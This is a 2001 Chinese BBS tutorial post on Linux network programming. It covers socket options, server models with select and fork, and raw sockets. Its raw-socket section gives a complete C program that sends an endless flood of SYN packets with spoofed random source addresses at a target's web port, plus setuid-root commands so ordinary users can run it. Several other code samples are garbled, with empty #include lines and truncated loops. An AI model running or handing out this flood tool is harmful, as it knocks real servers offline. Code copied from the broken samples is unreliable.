@@ -1,0 +1,430 @@
+日月光华 -- Programming精华区文章阅读
+--------------------------------------------------------------------------------
+ 发信人: freshbird (真菜鸟~快乐的愚人), 信区: Programming
+标  题: 学习Linux网络编程(4) 
+发信站: 日月光华站 (Mon Apr  2 16:55:47 2001) , 站内信件
+
+8. 套接字选项
+有时候我们要控制套接字的行为(如修改缓冲区的大小),这个时候我们就要控制套接字的
+选项了.
+8.1 getsockopt和setsockopt
+int getsockopt(int sockfd,int level,int optname,void *optval,socklen_t *optl
+en)
+int setsockopt(int sockfd,int level,int optname,const void *optval,socklen_t
+ *optlen)
+level指定控制套接字的层次.可以取三种值: 1)SOL_SOCKET:通用套接字选项. 2)IPPRO
+TO_IP:IP选项. 3)IPPROTO_TCP:TCP选项.
+optname指定控制的方式(选项的名称),我们下面详细解释
+optval获得或者是设置套接字选项.根据选项名称的数据类型进行转换
+选项名称 说明 数据类型
+========================================================================
+SOL_SOCKET
+------------------------------------------------------------------------
+SO_BROADCAST 允许发送广播数据 int
+SO_DEBUG 允许调试 int
+SO_DONTROUTE 不查找路由 int
+SO_ERROR 获得套接字错误 int
+SO_KEEPALIVE 保持连接 int
+SO_LINGER 延迟关闭连接 struct linger
+SO_OOBINLINE 带外数据放入正常数据流 int
+SO_RCVBUF 接收缓冲区大小 int
+SO_SNDBUF 发送缓冲区大小 int
+SO_RCVLOWAT 接收缓冲区下限 int
+SO_SNDLOWAT 发送缓冲区下限 int
+SO_RCVTIMEO 接收超时 struct timeval
+SO_SNDTIMEO 发送超时 struct timeval
+SO_REUSERADDR 允许重用本地地址和端口 int
+SO_TYPE 获得套接字类型 int
+SO_BSDCOMPAT 与BSD系统兼容 int
+==========================================================================
+IPPROTO_IP
+--------------------------------------------------------------------------
+IP_HDRINCL 在数据包中包含IP首部 int
+IP_OPTINOS IP首部选项 int
+IP_TOS 服务类型
+IP_TTL 生存时间 int
+==========================================================================
+IPPRO_TCP
+--------------------------------------------------------------------------
+TCP_MAXSEG TCP最大数据段的大小 int
+TCP_NODELAY 不使用Nagle算法 int
+=========================================================================
+关于这些选项的详细情况请查看 Linux Programmers Manual
+8.2 ioctl
+ioctl可以控制所有的文件描述符的情况,这里介绍一下控制套接字的选项.
+int ioctl(int fd,int req,...)
+==========================================================================
+ioctl的控制选项
+--------------------------------------------------------------------------
+SIOCATMARK 是否到达带外标记 int
+FIOASYNC 异步输入/输出标志 int
+FIONREAD 缓冲区可读的字节数 int
+详细的选项请用 man ioctl_list 查看.
+9. 服务器模型
+学习过《软件工程》吧.软件工程可是每一个程序员"必修"的课程啊.如果你没有学习过
+, 建议你去看一看. 在这一章里面,我们一起来从软件工程的角度学习网络编程的思想.
+在我们写程序之前, 我们都应该从软件工程的角度规划好我们的软件,这样我们开发软件
+的效率才会高. 在网络程序里面,一般的来说都是许多客户机对应一个服务器.为了处理
+客户机的请求, 对服务端的程序就提出了特殊的要求.我们学习一下目前最常用的服务器
+模型.
+循环服务器:循环服务器在同一个时刻只可以响应一个客户端的请求
+并发服务器:并发服务器在同一个时刻可以响应多个客户端的请求
+9.1 循环服务器:UDP服务器
+UDP循环服务器的实现非常简单:UDP服务器每次从套接字上读取一个客户端的请求,处理
+, 然后将结果返回给客户机.
+可以用下面的算法来实现.
+socket(...);
+bind(...);
+while(1)
+{
+recvfrom(...);
+process(...);
+sendto(...);
+}
+因为UDP是非面向连接的,没有一个客户端可以老是占住服务端. 只要处理过程不是死循
+环, 服务器对于每一个客户机的请求总是能够满足.
+9.2 循环服务器:TCP服务器
+TCP循环服务器的实现也不难:TCP服务器接受一个客户端的连接,然后处理,完成了这个客
+户的所有请求后,断开连接.
+算法如下:
+socket(...);
+bind(...);
+listen(...);
+while(1)
+{
+accept(...);
+while(1)
+{
+read(...);
+process(...);
+write(...);
+}
+close(...);
+}
+TCP循环服务器一次只能处理一个客户端的请求.只有在这个客户的所有请求都满足后,
+服务器才可以继续后面的请求.这样如果有一个客户端占住服务器不放时,其它的客户机
+都不能工作了.因此,TCP服务器一般很少用循环服务器模型的.
+9.3 并发服务器:TCP服务器
+为了弥补循环TCP服务器的缺陷,人们又想出了并发服务器的模型. 并发服务器的思想是
+每一个客户机的请求并不由服务器直接处理,而是服务器创建一个 子进程来处理.
+算法如下:
+socket(...);
+bind(...);
+listen(...);
+while(1)
+{
+accept(...);
+if(fork(..)==0)
+{
+while(1)
+{
+read(...);
+process(...);
+write(...);
+}
+close(...);
+exit(...);
+}
+close(...);
+}
+TCP并发服务器可以解决TCP循环服务器客户机独占服务器的情况. 不过也同时带来了一
+个不小的问题.为了响应客户机的请求,服务器要创建子进程来处理. 而创建子进程是一
+种非常消耗资源的操作.
+9.4 并发服务器:多路复用I/O
+为了解决创建子进程带来的系统资源消耗,人们又想出了多路复用I/O模型.
+首先介绍一个函数select
+int select(int nfds,fd_set *readfds,fd_set *writefds,
+fd_set *except fds,struct timeval *timeout)
+void FD_SET(int fd,fd_set *fdset)
+void FD_CLR(int fd,fd_set *fdset)
+void FD_ZERO(fd_set *fdset)
+int FD_ISSET(int fd,fd_set *fdset)
+一般的来说当我们在向文件读写时,进程有可能在读写出阻塞,直到一定的条件满足. 比
+如我们从一个套接字读数据时,可能缓冲区里面没有数据可读(通信的对方还没有 发送数
+据过来),这个时候我们的读调用就会等待(阻塞)直到有数据可读.如果我们不 希望阻塞
+,我们的一个选择是用select系统调用. 只要我们设置好select的各个参数,那么当文件
+可以读写的时候select回"通知"我们 说可以读写了. readfds所有要读的文件文件描述
+符的集合
+writefds所有要的写文件文件描述符的集合
+exceptfds其他的服要向我们通知的文件描述符
+timeout超时设置.
+nfds所有我们监控的文件描述符中最大的那一个加1
+在我们调用select时进程会一直阻塞直到以下的一种情况发生. 1)有文件可以读.2)有文
+件可以写.3)超时所设置的时间到.
+为了设置文件描述符我们要使用几个宏. FD_SET将fd加入到fdset
+FD_CLR将fd从fdset里面清除
+FD_ZERO从fdset中清除所有的文件描述符
+FD_ISSET判断fd是否在fdset集合中
+使用select的一个例子
+int use_select(int *readfd,int n)
+{
+fd_set my_readfd;
+int maxfd;
+int i;
+maxfd=readfd[0];
+for(i=1;i if(readfd[i]>maxfd) maxfd=readfd[i];
+while(1)
+{
+/* 将所有的文件描述符加入 */
+FD_ZERO(&my_readfd);
+for(i=0;i FD_SET(readfd[i],*my_readfd);
+/* 进程阻塞 */
+select(maxfd+1,& my_readfd,NULL,NULL,NULL);
+/* 有东西可以读了 */
+for(i=0;i if(FD_ISSET(readfd[i],&my_readfd))
+{
+/* 原来是我可以读了 */
+we_read(readfd[i]);
+}
+}
+}
+使用select后我们的服务器程序就变成了.
+初始话(socket,bind,listen);
+while(1)
+{
+设置监听读写文件描述符(FD_*);
+调用select;
+如果是倾听套接字就绪,说明一个新的连接请求建立
+{
+建立连接(accept);
+加入到监听文件描述符中去;
+}
+否则说明是一个已经连接过的描述符
+{
+进行操作(read或者write);
+}
+}
+多路复用I/O可以解决资源限制的问题.着模型实际上是将UDP循环模型用在了TCP上面.
+这也就带来了一些问题.如由于服务器依次处理客户的请求,所以可能会导致有的客户 会
+等待很久.
+9.5 并发服务器:UDP服务器
+人们把并发的概念用于UDP就得到了并发UDP服务器模型. 并发UDP服务器模型其实是简单
+的.和并发的TCP服务器模型一样是创建一个子进程来处理的 算法和并发的TCP模型一样
+.
+除非服务器在处理客户端的请求所用的时间比较长以外,人们实际上很少用这种模型.
+9.6 一个并发TCP服务器实例
+#include
+#include
+#include
+#include
+#include
+#define MY_PORT 8888
+int main(int argc ,char **argv)
+{
+int listen_fd,accept_fd;
+struct sockaddr_in client_addr;
+int n;
+if((listen_fd=socket(AF_INET,SOCK_STREAM,0))<0)
+{
+printf("Socket Error:%s\n\a",strerror(errno));
+exit(1);
+}
+bzero(&client_addr,sizeof(struct sockaddr_in));
+client_addr.sin_family=AF_INET;
+client_addr.sin_port=htons(MY_PORT);
+client_addr.sin_addr.s_addr=htonl(INADDR_ANY);
+n=1;
+/* 如果服务器终止后,服务器可以第二次快速启动而不用等待一段时间 */
+setsockopt(listen_fd,SOL_SOCKET,SO_REUSEADDR,&n,sizeof(int));
+if(bind(listen_fd,(struct sockaddr *)&client_addr,sizeof(client_addr))<0)
+{
+printf("Bind Error:%s\n\a",strerror(errno));
+exit(1);
+}
+listen(listen_fd,5);
+while(1)
+{
+accept_fd=accept(listen_fd,NULL,NULL);
+if((accept_fd<0)&&(errno==EINTR))
+continue;
+else if(accept_fd<0)
+{
+printf("Accept Error:%s\n\a",strerror(errno));
+continue;
+}
+if((n=fork())==0)
+{
+/* 子进程处理客户端的连接 */
+char buffer[1024];
+close(listen_fd);
+n=read(accept_fd,buffer,1024);
+write(accept_fd,buffer,n);
+close(accept_fd);
+exit(0);
+}
+else if(n<0)
+printf("Fork Error:%s\n\a",strerror(errno));
+close(accept_fd);
+}
+}
+你可以用我们前面写客户端程序来调试着程序,或者是用来telnet调试
+10. 原始套接字
+我们在前面已经学习过了网络程序的两种套接字(SOCK_STREAM,SOCK_DRAGM).在这一章
+里面我们一起来学习另外一种套接字--原始套接字(SOCK_RAW). 应用原始套接字,我们可
+以编写出由TCP和UDP套接字不能够实现的功能. 注意原始套接字只能够由有root权限的
+人创建.
+10.1 原始套接字的创建
+int sockfd(AF_INET,SOCK_RAW,protocol)
+可以创建一个原始套接字.根据协议的类型不同我们可以创建不同类型的原始套接字 比
+如:IPPROTO_ICMP,IPPROTO_TCP,IPPROTO_UDP等等.详细的情况查看 下面我们以一个实例
+来说明原始套接字的创建和使用
+10.2 一个原始套接字的实例
+还记得DOS是什么意思吗?在这里我们就一起来编写一个实现DOS的小程序. 下面是程序的
+源代码
+/******************** DOS.c *****************/
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#define DESTPORT 80 /* 要攻击的端口(WEB) */
+#define LOCALPORT 8888
+void send_tcp(int sockfd,struct sockaddr_in *addr);
+unsigned short check_sum(unsigned short *addr,int len);
+int main(int argc,char **argv)
+{
+int sockfd;
+struct sockaddr_in addr;
+struct hostent *host;
+int on=1;
+if(argc!=2)
+{
+fprintf(stderr,"Usage:%s hostname\n\a",argv[0]);
+exit(1);
+}
+bzero(&addr,sizeof(struct sockaddr_in));
+addr.sin_family=AF_INET;
+addr.sin_port=htons(DESTPORT);
+if(inet_aton(argv[1],&addr.sin_addr)==0)
+{
+host=gethostbyname(argv[1]);
+if(host==NULL)
+{
+fprintf(stderr,"HostName Error:%s\n\a",hstrerror(h_errno));
+exit(1);
+}
+addr.sin_addr=*(struct in_addr *)(host->h_addr_list[0]);
+}
+/**** 使用IPPROTO_TCP创建一个TCP的原始套接字 ****/
+sockfd=socket(AF_INET,SOCK_RAW,IPPROTO_TCP);
+if(sockfd<0)
+{
+fprintf(stderr,"Socket Error:%s\n\a",strerror(errno));
+exit(1);
+}
+/******** 设置IP数据包格式,告诉系统内核模块IP数据包由我们自己来填写 ***/
+setsockopt(sockfd,IPPROTO_IP,IP_HDRINCL,&on,sizeof(on));
+/**** 没有办法,只用超级护用户才可以使用原始套接字 *********/
+setuid(getpid());
+/********* 发送炸弹了!!!! ****/
+send_tcp(sockfd,&addr);
+}
+/******* 发送炸弹的实现 *********/
+void send_tcp(int sockfd,struct sockaddr_in *addr)
+{
+char buffer[100]; /**** 用来放置我们的数据包 ****/
+struct ip *ip;
+struct tcphdr *tcp;
+int head_len;
+/******* 我们的数据包实际上没有任何内容,所以长度就是两个结构的长度 ***/
+head_len=sizeof(struct ip)+sizeof(struct tcphdr);
+bzero(buffer,100);
+/******** 填充IP数据包的头部,还记得IP的头格式吗? ******/
+ip=(struct ip *)buffer;
+ip->ip_v=IPVERSION; /** 版本一般的是 4 **/
+ip->ip_hl=sizeof(struct ip)>>2; /** IP数据包的头部长度 **/
+ip->ip_tos=0; /** 服务类型 **/
+ip->ip_len=htons(head_len); /** IP数据包的长度 **/
+ip->ip_id=0; /** 让系统去填写吧 **/
+ip->ip_off=0; /** 和上面一样,省点时间 **/
+ip->ip_ttl=MAXTTL; /** 最长的时间 255 **/
+ip->ip_p=IPPROTO_TCP; /** 我们要发的是 TCP包 **/
+ip->ip_sum=0; /** 校验和让系统去做 **/
+ip->ip_dst=addr->sin_addr; /** 我们攻击的对象 **/
+/******* 开始填写TCP数据包 *****/
+tcp=(struct tcphdr *)(buffer +sizeof(struct ip));
+tcp->source=htons(LOCALPORT);
+tcp->dest=addr->sin_port; /** 目的端口 **/
+tcp->seq=random();
+tcp->ack_seq=0;
+tcp->doff=5;
+tcp->syn=1; /** 我要建立连接 **/
+tcp->check=0;
+/** 好了,一切都准备好了.服务器,你准备好了没有?? ^_^ **/
+while(1)
+{
+/** 你不知道我是从那里来的,慢慢的去等吧! **/
+ip->ip_src.s_addr=random();
+/** 什么都让系统做了,也没有多大的意思,还是让我们自己来校验头部吧 */
+/** 下面这条可有可无 */
+tcp->check=check_sum((unsigned short *)tcp,
+sizeof(struct tcphdr));
+sendto(sockfd,buffer,head_len,0,addr,sizeof(struct sockaddr_in));
+}
+}
+/* 下面是首部校验和的算法,偷了别人的 */
+unsigned short check_sum(unsigned short *addr,int len)
+{
+register int nleft=len;
+register int sum=0;
+register short *w=addr;
+short answer=0;
+while(nleft>1)
+{
+sum+=*w++;
+nleft-=2;
+}
+if(nleft==1)
+{
+*(unsigned char *)(&answer)=*(unsigned char *)w;
+sum+=answer;
+}
+sum=(sum>>16)+(sum&0xffff);
+sum+=(sum>>16);
+answer=~sum;
+return(answer);
+}
+编译一下,拿localhost做一下实验,看看有什么结果.(千万不要试别人的啊). 为了让普
+通用户可以运行这个程序,我们应该将这个程序的所有者变为root,且 设置setuid位
+[root@hoyt /root]#chown root DOS
+[root@hoyt /root]#chmod +s DOS
+10.3 总结
+原始套接字和一般的套接字不同的是以前许多由系统做的事情,现在要由我们自己来做了
+. 不过这里面是不是有很多的乐趣呢. 当我们创建了一个TCP套接字的时候,我们只是负
+责把我们要发送的内容(buffer)传递给了系统. 系统在收到我们的数据后,回自动的调用
+相应的模块给数据加上TCP头部,然后加上IP头部. 再发送出去.而现在是我们自己创建各
+个的头部,系统只是把它们发送出去. 在上面的实例中,由于我们要修改我们的源IP地址
+,所以我们使用了setsockopt函数,如果我们只是修改TCP数据,那么IP数据一样也可以由
+系统来创建的.
+11. 后记
+总算完成了网络编程这个教程.算起来我差不多写了一个星期,原来以为写这个应该是一
+件 不难的事,做起来才知道原来有很多的地方都比我想象的要难.我还把很多的东西都省
+略掉了 不过写完了这篇教程以后,我好象对网络的认识又增加了一步.
+如果我们只是编写一般的 网络程序还是比较容易的,但是如果我们想写出比较好的网络
+程序我们还有着遥远的路要走. 网络程序一般的来说都是多进程加上多线程的.为了处理
+好他们内部的关系,我们还要学习 进程之间的通信.在网络程序里面有着许许多多的突发
+事件,为此我们还要去学习更高级的 事件处理知识.现在的信息越来越多了,为了处理好
+这些信息,我们还要去学习数据库. 如果要编写出有用的黑客软件,我们还要去熟悉各种
+网络协议.总之我们要学的东西还很多很多.
+看一看外国的软件水平,看一看印度的软件水平,宝岛台湾的水平,再看一看我们自己的
+软件水平大家就会知道了什么叫做差距.我们现在用的软件有几个是我们中国人自己编写
+的.
+不过大家不要害怕,不用担心.只要我们还是清醒的,还能够认清我们和别人的差距, 我们
+就还有希望. 毕竟我们现在还年轻.只要我们努力,认真的去学习,我们一定能够学好的.
+我们就可以追上别人直到超过别人!
+相信一点:
+别人可以做到的我们一样可以做到,而且可以比别人做的更好!
+勇敢的freshbird和你的mm,为了我们伟大祖国的软件产业,为了祖国的未来,努力的去奋斗吧!祖国会
+记住你们的! 
+
+--
+※ 来源:·日月光华站 bbs.fudan.edu.cn·[FROM: 202.119.32.102]
+
+ 
+
+--------------------------------------------------------------------------------
+[返回上一页] [本讨论区]
